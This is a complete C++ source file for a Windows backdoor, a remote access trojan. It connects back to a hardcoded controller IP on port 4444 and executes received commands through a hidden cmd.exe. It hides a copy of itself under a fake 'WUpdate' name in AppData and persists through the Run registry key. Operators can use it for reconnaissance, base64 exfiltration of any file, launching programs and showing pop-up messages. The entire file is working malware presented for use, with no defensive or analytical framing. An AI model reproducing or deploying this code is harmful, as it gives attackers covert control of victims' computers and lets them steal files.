// victim: windows x64, static, connects back to controller
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>
#include <fstream>
#include <sstream>
#include <mutex>
#include <algorithm>

static const char* HOST = "90.167.50.27";   // <-- controller IP
static const int   PORT = 4444;
static const int   RECONNECT_MS = 5000;
static const int   BUFFER = 65536;

static std::string run_shell(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    HANDLE r, w;
    if (!CreatePipe(&r, &w, &sa, 0)) return "[pipe fail]";
    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = w; si.hStdError = w; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /C " + cmd;
    std::vector<char> b(full.begin(), full.end()); b.push_back(0);
    if (!CreateProcessA(nullptr, b.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(r); CloseHandle(w); return "[spawn fail]";
    }
    CloseHandle(w);
    std::string o; char tmp[4096]; DWORD got;
    while (ReadFile(r, tmp, sizeof(tmp), &got, nullptr) && got) o.append(tmp, got);
    CloseHandle(r);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return o.empty() ? "[no output]\n" : o;
}

static std::string self_path() {
    char p[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, p, MAX_PATH);
    return p;
}

static std::string drop_self() {
    char p[MAX_PATH] = {0};
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, p);
    std::string d = std::string(p) + "\\Microsoft\\WUpdate";
    CreateDirectoryA(d.c_str(), nullptr);
    std::string dst = d + "\\svc.exe";
    if (_stricmp(self_path().c_str(), dst.c_str()) != 0) {
        CopyFileA(self_path().c_str(), dst.c_str(), FALSE);
        SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    return dst;
}

static void persist(const std::string& path) {
    HKEY k;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &k, nullptr) == ERROR_SUCCESS) {
        RegSetValueExA(k, "WUpdate", 0, REG_SZ,
            (const BYTE*)path.c_str(), (DWORD)path.size()+1);
        RegCloseKey(k);
    }
}

static std::string read_file_b64(const std::string& path) {
    std::ifstream f(path, std::ios::binary); if (!f) return "[open fail]";
    std::vector<BYTE> v((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string o;
    for (size_t i = 0; i < v.size(); i += 3) {
        size_t n = std::min<size_t>(3, v.size()-i);
        DWORD x = (v[i]<<16) | ((n>1?v[i+1]:0)<<8) | (n>2?v[i+2]:0);
        o += tbl[(x>>18)&63]; o += tbl[(x>>12)&63];
        o += n>1 ? tbl[(x>>6)&63] : '=';
        o += n>2 ? tbl[x&63] : '=';
    }
    return o;
}

static std::string dispatch(const std::string& raw) {
    std::string c = raw;
    while (!c.empty() && (c.back()=='\n'||c.back()=='\r')) c.pop_back();
    if (c.empty()) return "";
    if (c.rfind("!exec ", 0) == 0) return run_shell(c.substr(6));
    if (c.rfind("!open ", 0) == 0) {
        HINSTANCE rc = ShellExecuteA(nullptr, "open", c.substr(6).c_str(),
                                     nullptr, nullptr, SW_SHOWNORMAL);
        return (INT_PTR)rc > 32 ? "launched\n" : "launch-fail\n";
    }
    if (c.rfind("!ad ", 0) == 0) {
        std::string t = c.substr(4);
        std::thread([t]{ MessageBoxA(nullptr, t.c_str(), "Notice",
            MB_OK|MB_ICONINFORMATION|MB_TOPMOST); }).detach();
        return "ad-shown\n";
    }
    if (c == "!recon") {
        char h[256]; DWORD len = 256; GetComputerNameA(h, &len);
        std::ostringstream o;
        o << "host=" << h << " user=" << std::getenv("USERNAME")
          << " pid=" << GetCurrentProcessId() << "\n";
        return o.str();
    }
    if (c == "!persist") {
        std::string p = drop_self();
        persist(p);
        return "persist ok " + p + "\n";
    }
    if (c.rfind("!pull ", 0) == 0) return read_file_b64(c.substr(6)) + "\n";
    return run_shell(c);
}

int main() {
    HANDLE mx = CreateMutexA(nullptr, FALSE, "Global\\WUpdateSvc");
    if (mx && GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    std::string me = drop_self();
    persist(me);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) { Sleep(RECONNECT_MS); continue; }
        sockaddr_in sa{}; sa.sin_family = AF_INET;
        sa.sin_port = htons(PORT);
        inet_pton(AF_INET, HOST, &sa.sin_addr);
        if (connect(s, (sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
            closesocket(s); Sleep(RECONNECT_MS); continue;
        }
        char buf[BUFFER];
        while (true) {
            int n = recv(s, buf, BUFFER-1, 0);
            if (n <= 0) break;
            buf[n] = 0;
            std::string o = dispatch(buf);
            if (!o.empty()) send(s, o.data(), (int)o.size(), 0);
        }
        closesocket(s);
        Sleep(RECONNECT_MS);
    }
    return 0;
}